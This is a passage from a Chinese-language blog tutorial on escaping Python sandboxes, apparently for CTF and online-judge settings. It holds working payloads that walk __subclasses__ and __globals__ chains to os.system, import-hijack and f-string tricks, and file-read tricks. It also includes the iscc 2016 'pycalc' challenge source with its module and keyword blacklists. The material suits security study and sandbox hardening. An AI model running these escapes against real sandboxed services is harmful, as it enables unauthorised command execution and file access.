<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import site</span><br><span class="line">&gt;&gt;&gt; site.os</span><br><span class="line">&lt;module &#39;os&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;3.6.5&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import site</span><br><span class="line">&gt;&gt;&gt; os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">NameError: name &#39;os&#39; is not defined</span><br><span class="line">&gt;&gt;&gt; os &#x3D; reload(site.os)</span><br><span class="line">&gt;&gt;&gt; os.system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>还有，既然所有的类都继承的<code>object</code>，那么我们先用<code>__subclasses__</code>看看它的子类，以 2.x 为例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()): print i</span><br><span class="line">...</span><br><span class="line">(0, &lt;type &#39;type&#39;&gt;)</span><br><span class="line">(1, &lt;type &#39;weakref&#39;&gt;)</span><br><span class="line">(2, &lt;type &#39;weakcallableproxy&#39;&gt;)</span><br><span class="line">(3, &lt;type &#39;weakproxy&#39;&gt;)</span><br><span class="line">(4, &lt;type &#39;int&#39;&gt;)</span><br><span class="line">(5, &lt;type &#39;basestring&#39;&gt;)</span><br><span class="line">(6, &lt;type &#39;bytearray&#39;&gt;)</span><br><span class="line">(7, &lt;type &#39;list&#39;&gt;)</span><br><span class="line">(8, &lt;type &#39;NoneType&#39;&gt;)</span><br><span class="line">(9, &lt;type &#39;NotImplementedType&#39;&gt;)</span><br><span class="line">(10, &lt;type &#39;traceback&#39;&gt;)</span><br><span class="line">(11, &lt;type &#39;super&#39;&gt;)</span><br><span class="line">(12, &lt;type &#39;xrange&#39;&gt;)</span><br><span class="line">(13, &lt;type &#39;dict&#39;&gt;)</span><br><span class="line">(14, &lt;type &#39;set&#39;&gt;)</span><br><span class="line">(15, &lt;type &#39;slice&#39;&gt;)</span><br><span class="line">(16, &lt;type &#39;staticmethod&#39;&gt;)</span><br><span class="line">(17, &lt;type &#39;complex&#39;&gt;)</span><br><span class="line">(18, &lt;type &#39;float&#39;&gt;)</span><br><span class="line">(19, &lt;type &#39;buffer&#39;&gt;)</span><br><span class="line">(20, &lt;type &#39;long&#39;&gt;)</span><br><span class="line">(21, &lt;type &#39;frozenset&#39;&gt;)</span><br><span class="line">(22, &lt;type &#39;property&#39;&gt;)</span><br><span class="line">(23, &lt;type &#39;memoryview&#39;&gt;)</span><br><span class="line">(24, &lt;type &#39;tuple&#39;&gt;)</span><br><span class="line">(25, &lt;type &#39;enumerate&#39;&gt;)</span><br><span class="line">(26, &lt;type &#39;reversed&#39;&gt;)</span><br><span class="line">(27, &lt;type &#39;code&#39;&gt;)</span><br><span class="line">(28, &lt;type &#39;frame&#39;&gt;)</span><br><span class="line">(29, &lt;type &#39;builtin_function_or_method&#39;&gt;)</span><br><span class="line">(30, &lt;type &#39;instancemethod&#39;&gt;)</span><br><span class="line">(31, &lt;type &#39;function&#39;&gt;)</span><br><span class="line">(32, &lt;type &#39;classobj&#39;&gt;)</span><br><span class="line">(33, &lt;type &#39;dictproxy&#39;&gt;)</span><br><span class="line">(34, &lt;type &#39;generator&#39;&gt;)</span><br><span class="line">(35, &lt;type &#39;getset_descriptor&#39;&gt;)</span><br><span class="line">(36, &lt;type &#39;wrapper_descriptor&#39;&gt;)</span><br><span class="line">(37, &lt;type &#39;instance&#39;&gt;)</span><br><span class="line">(38, &lt;type &#39;ellipsis&#39;&gt;)</span><br><span class="line">(39, &lt;type &#39;member_descriptor&#39;&gt;)</span><br><span class="line">(40, &lt;type &#39;file&#39;&gt;)</span><br><span class="line">(41, &lt;type &#39;PyCapsule&#39;&gt;)</span><br><span class="line">(42, &lt;type &#39;cell&#39;&gt;)</span><br><span class="line">(43, &lt;type &#39;callable-iterator&#39;&gt;)</span><br><span class="line">(44, &lt;type &#39;iterator&#39;&gt;)</span><br><span class="line">(45, &lt;type &#39;sys.long_info&#39;&gt;)</span><br><span class="line">(46, &lt;type &#39;sys.float_info&#39;&gt;)</span><br><span class="line">(47, &lt;type &#39;EncodingMap&#39;&gt;)</span><br><span class="line">(48, &lt;type &#39;fieldnameiterator&#39;&gt;)</span><br><span class="line">(49, &lt;type &#39;formatteriterator&#39;&gt;)</span><br><span class="line">(50, &lt;type &#39;sys.version_info&#39;&gt;)</span><br><span class="line">(51, &lt;type &#39;sys.flags&#39;&gt;)</span><br><span class="line">(52, &lt;type &#39;exceptions.BaseException&#39;&gt;)</span><br><span class="line">(53, &lt;type &#39;module&#39;&gt;)</span><br><span class="line">(54, &lt;type &#39;imp.NullImporter&#39;&gt;)</span><br><span class="line">(55, &lt;type &#39;zipimport.zipimporter&#39;&gt;)</span><br><span class="line">(56, &lt;type &#39;posix.stat_result&#39;&gt;)</span><br><span class="line">(57, &lt;type &#39;posix.statvfs_result&#39;&gt;)</span><br><span class="line">(58, &lt;class &#39;warnings.WarningMessage&#39;&gt;)</span><br><span class="line">(59, &lt;class &#39;warnings.catch_warnings&#39;&gt;)</span><br><span class="line">(60, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;)</span><br><span class="line">(61, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;)</span><br><span class="line">(62, &lt;class &#39;_abcoll.Hashable&#39;&gt;)</span><br><span class="line">(63, &lt;type &#39;classmethod&#39;&gt;)</span><br><span class="line">(64, &lt;class &#39;_abcoll.Iterable&#39;&gt;)</span><br><span class="line">(65, &lt;class &#39;_abcoll.Sized&#39;&gt;)</span><br><span class="line">(66, &lt;class &#39;_abcoll.Container&#39;&gt;)</span><br><span class="line">(67, &lt;class &#39;_abcoll.Callable&#39;&gt;)</span><br><span class="line">(68, &lt;type &#39;dict_keys&#39;&gt;)</span><br><span class="line">(69, &lt;type &#39;dict_items&#39;&gt;)</span><br><span class="line">(70, &lt;type &#39;dict_values&#39;&gt;)</span><br><span class="line">(71, &lt;class &#39;site._Printer&#39;&gt;)</span><br><span class="line">(72, &lt;class &#39;site._Helper&#39;&gt;)</span><br><span class="line">(73, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;)</span><br><span class="line">(74, &lt;type &#39;_sre.SRE_Match&#39;&gt;)</span><br><span class="line">(75, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;)</span><br><span class="line">(76, &lt;class &#39;site.Quitter&#39;&gt;)</span><br><span class="line">(77, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;)</span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;)</span><br></pre></td></tr></table></figure>

<p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__[&#39;os&#39;]</span><br><span class="line">&lt;module &#39;os&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;2.7.15&#x2F;lib&#x2F;python2.7&#x2F;os.pyc&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p>
<p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import warnings</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; warnings.os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#39;module&#39; object has no attribute &#39;os&#39;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; warnings.linecache</span><br><span class="line">&lt;module &#39;linecache&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;2.7.15&#x2F;lib&#x2F;python2.7&#x2F;linecache.pyc&#39;&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; warnings.linecache.os</span><br><span class="line">&lt;module &#39;os&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;2.7.15&#x2F;lib&#x2F;python2.7&#x2F;os.pyc&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>在继承链中就可以这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>顺便说一下，<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    def __init__(self, record&#x3D;False, module&#x3D;None):</span><br><span class="line">...</span><br><span class="line">        self._module &#x3D; sys.modules[&#39;warnings&#39;] if module is None else module</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>所以通过<code>_module</code>也可以构造 payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39;][0]()._module.linecache.os.system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p>
<p>同样，py3.x 中有<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，利用方式可以为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>顺便提一下，<code>object</code> 本来就是可以使用的，如果没过滤这个变量的话，payload 可以简化为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)</span><br></pre></td></tr></table></figure>

<p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</span><br></pre></td></tr></table></figure>

<p>或者简单一点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</span><br></pre></td></tr></table></figure>

<p>还可以这样利用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class test(dict):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        print(super(test, self).keys.__class__.__call__(eval, &#39;1+1&#39;))</span><br><span class="line">        # 如果是 3.x 的话可以简写为：</span><br><span class="line">        # super().keys.__class__.__call__(eval, &#39;1+1&#39;))</span><br><span class="line">test()</span><br></pre></td></tr></table></figure>

<p>上面的这些利用方式总结起来就是通过<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__bases__</code>等等属性/方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p>
<p>最后，继承链的逃逸还有一些利用第三方库的方式，比如 <code>jinja2</code>，这类利用方式应该是叫 <code>SSTI</code>，可以看这个：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">传送门</a>，这里就不多说了。</p>
<h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>2.x 有个内建的 <code>file</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; file(&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3\n&#39;</span><br><span class="line">&gt;&gt;&gt; file(&#39;key&#39;, &#39;w&#39;).write(&#39;Macr0phag3&#39;)</span><br><span class="line">&gt;&gt;&gt; file(&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3&#39;</span><br></pre></td></tr></table></figure>

<p>还有个 <code>open</code>，2.x 与 3.x 通用。</p>
<p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)。</p>
<p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来：</p>
<p>math.py：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">print(os.system(&#39;whoami&#39;))</span><br></pre></td></tr></table></figure>

<p>调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import math</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;re&#39; in sys.modules</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &#39;math&#39; in sys.modules</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>当然在<code>import re</code> 之前<code>del sys.modules[&#39;re&#39;]</code>也不是不可以…</p>
<p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p>
<p>读文件暂时没什么发现特别的地方。</p>
<p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__.open(&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3\n&#39;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40](&#39;key&#39;).read()</span><br><span class="line">&#39;Macr0phag3&#39;</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>过滤<code>[</code>、<code>]</code>：这个行为不像是 oj 会做得出来的，ctf 倒是有可能出现。应对的方式就是将<code>[]</code>的功能用<code>pop</code>    、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>    ）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&#39;linecache&#39;).os.popen(&#39;whoami&#39;).read()</span><br><span class="line">&#39;macr0phag3\n&#39;</span><br></pre></td></tr></table></figure>

<p>利用新特性：PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features" target="_blank" rel="noopener">传送门</a>，食用方式：<a href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings" target="_blank" rel="noopener">传送门</a>。所以我们就有了一种船新的利用方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f&#39;&#123;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#39;</span><br><span class="line">macr0phag3</span><br><span class="line">&#39;0&#39;</span><br></pre></td></tr></table></figure>

<p>关注每次版本增加的新特性，或许能淘到点宝贝。</p>
<p>序列化相关：序列化也是能用来逃逸，但是关于序列化的安全问题还挺多的，如果有时间我再写一篇文章来讨论好了。</p>
<h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><p>这个例子来自<code>iscc 2016</code>的<code>Pwn300 pycalc</code>，相当有趣：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">def banner():</span><br><span class="line">    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">    print &quot;   Simple calculator implemented by python   &quot;</span><br><span class="line">    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">def getexp():</span><br><span class="line">    return raw_input(&quot;&gt;&gt;&gt; &quot;)</span><br><span class="line"></span><br><span class="line">def _hook_import_(name, *args, **kwargs):</span><br><span class="line">    module_blacklist &#x3D; [&#39;os&#39;, &#39;sys&#39;, &#39;time&#39;, &#39;bdb&#39;, &#39;bsddb&#39;, &#39;cgi&#39;,</span><br><span class="line">                        &#39;CGIHTTPServer&#39;, &#39;cgitb&#39;, &#39;compileall&#39;, &#39;ctypes&#39;, &#39;dircache&#39;,</span><br><span class="line">                        &#39;doctest&#39;, &#39;dumbdbm&#39;, &#39;filecmp&#39;, &#39;fileinput&#39;, &#39;ftplib&#39;, &#39;gzip&#39;,</span><br><span class="line">                        &#39;getopt&#39;, &#39;getpass&#39;, &#39;gettext&#39;, &#39;httplib&#39;, &#39;importlib&#39;, &#39;imputil&#39;,</span><br><span class="line">                        &#39;linecache&#39;, &#39;macpath&#39;, &#39;mailbox&#39;, &#39;mailcap&#39;, &#39;mhlib&#39;, &#39;mimetools&#39;,</span><br><span class="line">                        &#39;mimetypes&#39;, &#39;modulefinder&#39;, &#39;multiprocessing&#39;, &#39;netrc&#39;, &#39;new&#39;,</span><br><span class="line">                        &#39;optparse&#39;, &#39;pdb&#39;, &#39;pipes&#39;, &#39;pkgutil&#39;, &#39;platform&#39;, &#39;popen2&#39;, &#39;poplib&#39;,</span><br><span class="line">                        &#39;posix&#39;, &#39;posixfile&#39;, &#39;profile&#39;, &#39;pstats&#39;, &#39;pty&#39;, &#39;py_compile&#39;,</span><br><span class="line">                        &#39;pyclbr&#39;, &#39;pydoc&#39;, &#39;rexec&#39;, &#39;runpy&#39;, &#39;shlex&#39;, &#39;shutil&#39;, &#39;SimpleHTTPServer&#39;,</span><br><span class="line">                        &#39;SimpleXMLRPCServer&#39;, &#39;site&#39;, &#39;smtpd&#39;, &#39;socket&#39;, &#39;SocketServer&#39;,</span><br><span class="line">                        &#39;subprocess&#39;, &#39;sysconfig&#39;, &#39;tabnanny&#39;, &#39;tarfile&#39;, &#39;telnetlib&#39;,</span><br><span class="line">                        &#39;tempfile&#39;, &#39;Tix&#39;, &#39;trace&#39;, &#39;turtle&#39;, &#39;urllib&#39;, &#39;urllib2&#39;,</span><br><span class="line">                        &#39;user&#39;, &#39;uu&#39;, &#39;webbrowser&#39;, &#39;whichdb&#39;, &#39;zipfile&#39;, &#39;zipimport&#39;]</span><br><span class="line">    for forbid in module_blacklist:</span><br><span class="line">        if name &#x3D;&#x3D; forbid:        # don&#39;t let user import these modules</span><br><span class="line">            raise RuntimeError(&#39;No you can\&#39; import &#123;0&#125;!!!&#39;.format(forbid))</span><br><span class="line">    # normal modules can be imported</span><br><span class="line">    return __import__(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">def sandbox_filter(command):</span><br><span class="line">    blacklist &#x3D; [&#39;exec&#39;, &#39;sh&#39;, &#39;__getitem__&#39;, &#39;__setitem__&#39;,</span><br><span class="line">                 &#39;&#x3D;&#39;, &#39;open&#39;, &#39;read&#39;, &#39;sys&#39;, &#39;;&#39;, &#39;os&#39;]</span><br><span class="line">    for forbid in blacklist:</span><br><span class="line">        if forbid in command:</span><br><span class="line">            return 0</span><br><span class="line">    return 1</span><br><span class="line"></span><br><span class="line">def sandbox_exec(command):      # sandbox user input</span><br><span class="line">    result &#x3D; 0</span><br><span class="line">    __sandboxed_builtins__ &#x3D; dict(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[&#39;__import__&#39;] &#x3D; _hook_import_    # hook import</span><br><span class="line">    del __sandboxed_builtins__[&#39;open&#39;]</span><br><span class="line">    _global &#x3D; &#123;</span><br><span class="line">        &#39;__builtins__&#39;: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    if sandbox_filter(command) &#x3D;&#x3D; 0:</span><br><span class="line">        print &#39;Malicious user input detected!!!&#39;</span><br><span class="line">        exit(0)</span><br><span class="line">    command &#x3D; &#39;result &#x3D; &#39; + command</span><br><span class="line">    try:</span><br><span class="line">        exec command in _global     # do calculate in a sandboxed environment</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print e</span><br><span class="line">        return 0</span><br><span class="line">    result &#x3D; _global[&#39;result&#39;]  # extract the result</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line">while 1:</span><br><span class="line">    command &#x3D; getexp()</span><br><span class="line">    print sandbox_exec(command)</span><br></pre></td></tr></table></figure>

<p><code>exec command in _global</code> 这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code>，这里不赘述了，感兴趣可以看这篇文章：<a href="http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html" target="_blank" rel="noopener">传送门</a>。exec 加上定制的 globals    会使得沙箱安全很多，一些常规的 payload 是没法使用的，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__</span><br><span class="line">restricted attribute</span><br><span class="line">&gt;&gt;&gt; getattr(getattr(__import__(&#39;types&#39;), &#39;FileType&#39;)(&#39;key&#39;), &#39;re&#39;&#39;ad&#39;)()</span><br><span class="line">file() constructor not accessible in restricted mode</span><br></pre></td></tr></table></figure>

<p>不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types 库，来执行任意命令：</p>
